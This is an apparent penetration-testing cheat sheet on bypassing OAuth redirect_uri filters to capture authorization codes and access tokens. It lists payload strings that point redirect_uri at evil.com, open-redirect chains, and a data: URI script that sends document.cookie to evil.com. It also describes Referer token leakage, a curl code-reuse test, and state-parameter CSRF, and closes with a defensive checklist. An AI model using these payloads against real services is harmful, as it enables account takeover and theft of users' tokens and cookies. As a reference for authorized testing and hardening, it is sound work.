# OAuth redirect_uri filtering bypasses and token theft — Open WHEN: recon shows an OAuth2/OIDC authorization endpoint (`/authorize`, `/oauth/authorize`, `/signin/authorize`) that takes a `redirect_uri`, `client_id`, `response_type`, `scope`, and `state`, and you want concrete strings to capture an auth code or access token

The core flaw: the authorization server should match `redirect_uri` as an **exact string** against a per-client allowlist of full URLs. Anything looser — whitelisting a whole domain, prefix/suffix matching, honoring open redirects — lets you redirect the code/token to a host you control. Capture the code or token, then redeem it. `response_type=token` (implicit) puts the access token straight in the URL fragment; `response_type=code` puts a single-use code in the query string.

## 1. Point redirect_uri at a host you control
Try, in order, from most to least obvious. Watch for the auth server bouncing the browser to your host with `code=` or `#access_token=`:
```
redirect_uri=https://evil.com
redirect_uri=https://attacker-sub.target.com        # if any subdomain is trusted
redirect_uri=https://localhost.evil.com             # domain that *starts* with an allowed token
redirect_uri=https://target.com.evil.com            # suffix-trick on a prefix matcher
redirect_uri=https://evil.com/target.com            # path-trick on a suffix matcher
redirect_uri=https://target.com@evil.com            # userinfo-trick: host is evil.com
redirect_uri=https://target.com%2f%2f.evil.com
```

## 2. Chain through an open redirect on an allowed host
If only `target.com` (or a partner like `accounts.google.com`) is whitelisted but it hosts an open redirect, bounce the code/token off it to your server:
```
redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
redirect_uri=https://target.com/logout?returnTo=https://evil.com
redirect_uri=https://target.com/oauth2/authorize?...&redirect_uri=https://apps.facebook.com/attacker/
```

## 3. Change scope to slip past a redirect_uri filter
Some servers only validate `redirect_uri` for certain scopes. Setting an invalid/unexpected scope can disable the check:
```
/admin/oauth/authorize?...&scope=a&redirect_uri=https://evil.com
```

## 4. XSS via redirect_uri (data: URI) or state reflection
If the server reflects `redirect_uri` or `state` into an HTML response, or honors a `data:` scheme:
```
redirect_uri=data:text/html,<script>document.location='https://evil.com/?'+document.cookie</script>
...&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert(document.domain)</script>
```

## 5. Token leak via Referer
If you have HTML injection (not full XSS) on a page reachable during/after the OAuth flow, place an `<img src="https://evil.com/x">` so the access token in the URL leaks through the outbound `Referer` header to your host. Also check whether the token survives in the URL long enough to leak to third-party analytics/CDN scripts on the redirect landing page.

## 6. Authorization-code reuse (RFC violation)
A code MUST be single-use. Capture one code, redeem it twice at `/token`:
```bash
curl -s https://target.com/token -d grant_type=authorization_code \
  -d code=<CODE> -d redirect_uri=<URI> -d client_id=<ID> -d client_secret=<SECRET>
# replay the exact same request — a compliant server returns invalid_grant AND
# revokes every token previously issued for that code. If the second call returns
# a fresh access token, code-reuse protection is missing.
```

## 7. CSRF on the callback (missing/weak state)
If the callback (`/callback?code=...`) doesn't bind to the user's session via an unguessable `state`, an attacker can run their own OAuth flow, capture *their* code, and trick the victim's browser into hitting `/callback?code=<attacker_code>` — linking the attacker's social identity to the victim's session (forced profile linking) or vice versa. Test: remove `state`, reuse a stale `state`, or replay another session's code at the victim's callback.

## What "should" be enforced (every gap is a finding)
- `redirect_uri` matched as an exact full-URL string, no prefix/suffix/wildcard/path tolerance.
- `state` present, unguessable, single-use, bound to the browser session.
- Auth code single-use; reuse revokes the issued token family.
- Implicit flow (`response_type=token`) disabled; PKCE (`S256`, not `plain`) required.

## Validation
Real only when you actually receive a code/token at a host you control (or prove single-use-code reuse succeeds), then redeem or replay it to reach a protected resource. False positive: the server rejects the modified `redirect_uri`, or the code/token never leaves the legitimate origin.
